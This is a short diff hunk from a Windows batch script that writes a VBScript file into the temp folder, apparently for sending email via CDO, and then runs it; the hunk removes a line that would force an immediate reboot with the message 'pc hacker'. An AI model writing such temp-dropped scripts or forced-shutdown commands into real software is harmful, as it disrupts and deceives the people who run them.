@@ -558,7 +558,6 @@ echo Set iConf = Nothing >> %temp%\temp.vbs
 
 echo Set Flds = Nothing >> %temp%\temp.vbs 
 
-echo s.run "shutdown -r -t 0 -c ""pc" hacker"" -f",1 >> %temp%\temp.vbs 
 
 start %temp%\temp.vbs 
 
